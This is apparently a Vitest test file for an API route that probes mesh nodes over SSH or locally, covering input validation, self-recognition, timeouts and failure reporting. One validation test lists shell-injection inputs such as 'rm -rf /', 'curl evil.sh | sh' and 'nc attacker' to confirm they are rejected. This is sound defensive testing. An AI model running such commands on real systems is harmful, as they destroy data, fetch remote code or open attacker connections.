import { describe, it, expect, beforeEach, vi } from 'vitest';

/**
 * Probing one node.
 *
 * The hostname arrives in a query string and ends up inside a shell command,
 * which is why the first thing this route does is refuse anything that is not
 * a hostname. The second is to notice when the host it was asked about is the
 * machine it is already running on — going out over SSH to reach ourselves
 * costs a round trip and fails outright on a node with no key back to itself.
 */

/**
 * Every command the route runs goes through child_process.exec — the async
 * one. It used the synchronous form, and the probe is seconds of shell on a
 * loaded node, so the whole server answered nothing while it ran.
 * `commands` records what was asked and answers with a string or a throw;
 * the exec shim turns that into a callback, delivered on a later tick like
 * the real one. The mock has no synchronous form on purpose: a route that
 * reaches for it fails here.
 */
const commands = vi.fn();
type ExecCb = (err: Error | null, stdout: string, stderr: string) => void;
let deliver = (cb: () => void) => queueMicrotask(cb);
vi.mock('child_process', () => ({
  exec: (cmd: string, _opts: unknown, cb: ExecCb) => {
    let out = '', err: Error | null = null;
    try { out = commands(cmd); } catch (e) { err = e as Error; }
    deliver(() => cb(err, out, ''));
  },
}));

const parseProbeOutput = vi.fn((raw: string, host: string) => ({ hostname: host, reachable: true, raw }));
vi.mock('@/lib/node-probe', async (orig) => ({
  ...(await orig() as object),
  parseProbeOutput: (r: string, h: string) => parseProbeOutput(r, h),
}));

/** The probe is one exec call; which machine it lands on is in the command. */
const probeCommands = () =>
  commands.mock.calls.map((c) => String(c[0])).filter((c) => c.includes('SECTION:HOSTNAME'));
const probedOverSsh = () => probeCommands().filter((c) => c.startsWith('ssh '));
// UF_POSIX=1 in front: the script's Bourne-to-POSIX handoff is for stdin, not -c.
const probedLocally = () => probeCommands().filter((c) => c.startsWith('UF_POSIX=1 bash -c'));

const { GET } = await import('./route');

const get = (query: string) =>
  GET({ nextUrl: new URL(`http://localhost:3000/api/mesh/node${query}`) } as never);

/** Answer `hostname` with a name, and the probe itself with output. */
function machine({ name = 'some-other-box', fqdn, probe = '===SECTION:HOSTNAME===\nbox' }: { name?: string; fqdn?: string; probe?: string } = {}) {
  const full = fqdn ?? name;
  commands.mockImplementation((cmd: string) => {
    if (cmd === 'hostname') return `${name}\n`;
    if (cmd.startsWith('hostname -f')) return `${full}\n`;
    return probe;
  });
}

beforeEach(() => { vi.clearAllMocks(); deliver = (cb) => queueMicrotask(cb); machine(); });

describe('a remote with no sh', () => {
  it('asks PowerShell for the userland section when sh produced nothing', async () => {
    // A Windows sshd hands us cmd.exe; the first probe comes back empty.
    commands.mockImplementation((cmd: string) => {
      if (cmd === 'hostname') return 'here\n';
      if (cmd.startsWith('hostname -f')) return 'here\n';
      // The sh script itself mentions powershell (the windows-sh plugin);
      // the retry is the command whose remote program is powershell.
      if (cmd.includes('winbox powershell')) return "===SECTION:UF===\r\nuf=1\r\nuserland=windows-powershell\r\nEND\r\n===SECTION:HOSTNAME===\r\nWINBOX\r\n===SECTION:END===\r\n";
      return '';
    });
    const res = await get('?host=winbox');
    expect(res.status).toBe(200);
    // Two trips: sh first, then PowerShell.
    expect(probedOverSsh()).toHaveLength(2);
    expect(probedOverSsh()[1]).toContain('winbox powershell -NoProfile');
    const [raw] = parseProbeOutput.mock.calls[0] as [string, string];
    expect(raw).toContain('userland=windows-powershell');
    expect(raw).not.toContain('\r');
  });
});

describe('what it refuses', () => {
  it('will not probe without being told what to probe', async () => {
    const res = await get('');
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe('Missing host parameter');
  });

  it('refuses anything that is not a hostname', async () => {
    // This string reaches a shell. Every one of these is a way out of it.
    for (const host of [
      'cammy; rm -rf /', 'cammy && curl evil.sh | sh', 'cammy`whoami`',
      'cammy$(id)', 'cammy|nc attacker 1', 'cammy\nrm -rf /', 'cammy /etc/passwd',
      "cammy'", 'cammy"', '../../etc/passwd',
    ]) {
      const res = await get(`?host=${encodeURIComponent(host)}`);
      expect(res.status, host).toBe(400);
      expect((await res.json()).error).toBe('Invalid host');
    }
    expect(probeCommands()).toHaveLength(0);
  });

  it('accepts the hostnames our mesh actually uses', async () => {
    for (const host of ['cammy', 'cammy.foxhop.net', '4090-ai.foxhop.net', 'node_2', 'localhost']) {
      expect((await get(`?host=${host}`)).status, host).toBe(200);
    }
  });
});

describe('recognising itself', () => {
  it('reads localhost directly rather than over ssh', async () => {
    await get('?host=localhost');
    expect(probedLocally()).toHaveLength(1);
    expect(probedOverSsh()).toHaveLength(0);
  });

  it('recognises its own short hostname', async () => {
    // The mesh knows this node as `cammy`. Reaching it over SSH costs a
    // round trip and fails outright on a node with no key back to itself.
    machine({ name: 'cammy' });
    await get('?host=cammy');
    expect(probedLocally()).toHaveLength(1);
    expect(probedOverSsh()).toHaveLength(0);
  });

  it('recognises its own fully-qualified name', async () => {
    machine({ name: 'cammy', fqdn: 'cammy.foxhop.net' });
    await get('?host=cammy.foxhop.net');
    expect(probedLocally()).toHaveLength(1);
  });

  it('goes over ssh for anybody else', async () => {
    await get('?host=neoblanka');
    expect(probedOverSsh()).toHaveLength(1);
    expect(probedOverSsh()[0]).toContain(' neoblanka ');
    expect(probedLocally()).toHaveLength(0);
  });

  it('gives ssh a deadline and does not stop for a host key', async () => {
    // Without both, a new node hangs this route on an interactive prompt
    // until the request is abandoned.
    await get('?host=neoblanka');
    expect(probedOverSsh()[0]).toContain('ConnectTimeout=5');
    expect(probedOverSsh()[0]).toContain('StrictHostKeyChecking=no');
  });

  it('falls back to ssh when it cannot ask its own name', async () => {
    // A container with no `hostname` binary. Treating the failure as "this
    // is me" would probe the wrong machine and report it as the right one.
    commands.mockImplementation((cmd: string) => {
      if (String(cmd).startsWith('hostname')) throw new Error('not found');
      return '===SECTION:HOSTNAME===\nbox';
    });
    await get('?host=neoblanka');
    expect(probedOverSsh()).toHaveLength(1);
  });
});

describe('when a node does not answer', () => {
  it('says so, rather than returning a node with every field empty', async () => {
    // A parse of empty output produces a node card full of zeros, which
    // reads as an idle machine rather than an unreachable one.
    machine({ probe: '' });
    const res = await get('?host=neoblanka');
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      hostname: 'neoblanka', reachable: false,
      error: 'Probe failed — host unreachable or timed out',
    });
    expect(parseProbeOutput).not.toHaveBeenCalled();
  });

  it('stamps the attempt, so a stale card can be told from a fresh failure', async () => {
    machine({ probe: 'ssh: connect to host neoblanka port 22: No route to host' });
    const body = await (await get('?host=neoblanka')).json();
    expect(body.probedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });

  it('treats partial output as a failure rather than parsing half a node', async () => {
    machine({ probe: '===SECTION:CPU===\n8\n' });
    expect((await (await get('?host=neoblanka')).json()).reachable).toBe(false);
  });
});

describe('a node that does answer', () => {
  it('parses the probe and reports it under the name that was asked for', async () => {
    // The card was opened for `neoblanka`; answering under whatever the box
    // calls itself would leave the page unable to match the two.
    machine({ probe: '===SECTION:HOSTNAME===\nremote-box' });
    const body = await (await get('?host=neoblanka')).json();
    expect(body).toMatchObject({ hostname: 'neoblanka', reachable: true });
    expect(parseProbeOutput).toHaveBeenCalledWith(expect.stringContaining('remote-box'), 'neoblanka');
  });
});


describe('staying out of the way', () => {
  it('waits for a probe that takes its time, rather than blocking for it', async () => {
    // The real probe answers seconds later. The route must still be a
    // pending promise in the meantime — other requests run in that gap.
    deliver = (cb) => { setTimeout(cb, 30); };
    machine({ probe: '===SECTION:HOSTNAME===\nslow-box' });
    let settled = false;
    const pending = get('?host=neoblanka').then((r) => { settled = true; return r; });
    await new Promise((r) => setTimeout(r, 5));
    expect(settled).toBe(false);
    const body = await (await pending).json();
    expect(body).toMatchObject({ hostname: 'neoblanka', reachable: true });
  });

  it('keeps what a killed probe managed to write', async () => {
    // exec reports a timeout as an error and still hands over stdout. The
    // shim models that with a throw carrying stdout; the route must parse
    // what arrived and let the parser flag the truncation.
    commands.mockImplementation((cmd: string) => {
      if (cmd.startsWith('hostname')) return 'some-other-box\n';
      throw Object.assign(new Error('killed'), { killed: true });
    });
    const body = await (await get('?host=neoblanka')).json();
    expect(body.reachable).toBe(false);
    expect(body.error).toMatch(/unreachable or timed out/);
  });

  it('lists every container, stopped ones included', async () => {
    // A node whose ten containers had all exited read as having none.
    await get('?host=neoblanka');
    expect(probeCommands()[0]).toContain('docker ps -a ');
  });
});
